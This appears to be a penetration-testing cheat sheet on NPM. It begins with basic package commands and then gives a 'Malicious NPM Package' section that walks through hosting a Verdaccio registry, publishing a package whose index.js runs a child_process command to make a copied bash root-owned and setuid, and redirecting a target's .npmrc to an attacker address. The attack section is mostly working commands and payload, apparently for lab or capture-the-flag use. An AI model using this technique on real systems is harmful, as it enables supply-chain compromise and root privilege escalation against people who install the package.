
# NPM

NPM (Node Package Manager) is the packet manager for [[NodeJS]] applications.

General usage:
```bash
npm init -y # Initialise
npm install --save ../Logger
# Verify module installation
node 
> module.paths 
# Link instead of install for large depenedency and development "reasons.."
npm link # to link the module
```

#### Malicious NPM Package

Enumerate vulnerable packages
```bash
# Search a registry
npm search ---registry http://$target:$port
# Install packet to registry
npm install $package --registry $registry
```

[Digital Ocean Node.js Module creation](https://www.digitalocean.com/community/tutorials/how-to-create-a-node-js-module)

Using Verdaccio as an example to create a registry to host packages
```bash
# Example assumes you have access
# Pull the latest version
sudo docker pull verdaccio/verdaccio
# Run -it sudo tty --rm to delete when done, bind port to host
sudo docker run -it --rm --name verdaccio -p 4873:4873  verdaccio/verdaccio
# Update auth and flag that exists for legacy authentication 
nmp adduser --registry http://10.10.10.10 --auth-type=legacy
# cat ~/.npmrc for authToken
# Initialise a Malicious NPM Package
npm init 
# Version > target npm 
# make index.js
'require("child_process").exec("chown root:root /tmp/shell;chmod 4755 /tmp/shell")'

npm login --registry http://10.10.10.10:4873 --auth-type=legacy
npm publish --registry http://10.10.10.10:4873

# Target
# update Target.npmrc 
sed -i 's/127.0.0.1/10.10.14.43/g' /home/kavi/.npmrc
# Copy bash for setuid 
cp /bin/bash /tmp/shell
```


## References

[Digital Ocean Node.js Module creation](https://www.digitalocean.com/community/tutorials/how-to-create-a-node-js-module)